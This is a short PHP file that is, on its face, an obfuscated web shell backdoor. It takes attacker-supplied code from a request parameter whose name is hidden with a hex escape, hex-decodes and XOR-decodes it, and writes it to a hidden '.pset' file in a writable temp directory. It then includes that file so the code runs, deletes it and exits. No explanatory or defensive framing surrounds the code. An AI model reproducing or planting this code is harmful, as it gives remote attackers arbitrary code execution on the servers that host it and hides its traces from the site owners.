<?php

if(!is_null($_REQUEST["\x72es"] ?? null)){
	$object = array_filter([session_save_path(), "/dev/shm", sys_get_temp_dir(), "/tmp", getcwd(), getenv("TMP"), ini_get("upload_tmp_dir"), "/var/tmp", getenv("TEMP")]);
	$ptr = hex2bin($_REQUEST["\x72es"]);
	$obj=  '';  for($r=0; $r<strlen($ptr); $r++){$obj .= chr(ord($ptr[$r]) ^ 50);}
	foreach ($object as $flag) {
    		if ((is_dir($flag) and is_writable($flag))) {
    $token = "$flag/.pset";
    if (@file_put_contents($token, $obj) !== false) {
	include $token;
	unlink($token);
	die();
}
}
}
}